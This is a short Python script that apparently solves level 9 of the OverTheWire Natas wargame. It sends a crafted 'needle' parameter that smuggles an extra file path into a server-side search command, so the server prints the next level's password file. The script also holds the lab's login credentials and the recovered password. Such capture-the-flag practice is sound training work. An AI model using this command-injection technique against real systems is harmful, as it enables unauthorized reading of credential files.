import requests
import re


url = 'http://natas9.natas.labs.overthewire.org/'
auth = requests.auth.HTTPBasicAuth('natas9','W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl')

response = requests.post(url, auth=auth, data={'submit':'submit','needle':'a /etc/natas_webpass/natas10 #'})
password = re.findall('(.*)', response.text)
print(password[38]) # nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

